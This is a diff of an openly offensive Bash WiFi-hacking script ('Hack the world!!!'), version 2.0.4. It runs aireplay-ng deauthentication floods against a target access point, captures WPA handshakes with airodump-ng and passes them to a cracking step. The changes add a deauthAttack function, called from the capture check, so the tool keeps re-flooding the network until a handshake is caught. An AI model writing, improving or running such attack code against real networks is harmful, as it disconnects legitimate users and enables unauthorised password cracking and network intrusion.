@@ -78,7 +78,7 @@ echo -e "${Red}
          ░                                  "
 echo -e "${Yellow} \n             Hack the world!!!     "
 echo -e "${Green}\n                    Developed by: Liam Bendix"
-echo -e "${Green}                         Version: 2.0.3 Stable"
+echo -e "${Green}                         Version: 2.0.4 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -247,7 +247,7 @@ network
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-sudo aireplay-ng --deauth 50 -a $bssid $foo
+sudo aireplay-ng --deauth 20 -a $bssid $foo
 stopMon
 echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 checkServices 
@@ -266,11 +266,11 @@ monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 echo -e "\e[32mAttacking...\e[0m"
-sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
-stopMon
+sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
 checkServices 
 check_cap_files
 check_eapol_in_cap
+stopMon
 crack
 
 }
@@ -539,15 +539,24 @@ check_cap_files() {
         done
         
         # If no valid .cap files with EAPOL are found, exit
-        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured, please try again! Exiting...\e[0m"
-        exit 1
+        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
+        deauthAttack
     else
         # No .cap files found
         echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
         sleep 3
-        exit 1
+        deauthAttack
     fi
 }
+
+
+deauthAttack () {
+echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
+echo -e "\e[32mAttacking... This could take a few minutes... Please wait!\e[0m"
+sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
+check_cap_files
+check_eapol_in_cap
+ } 
 
 macChange() {
      ##### Display available options #####
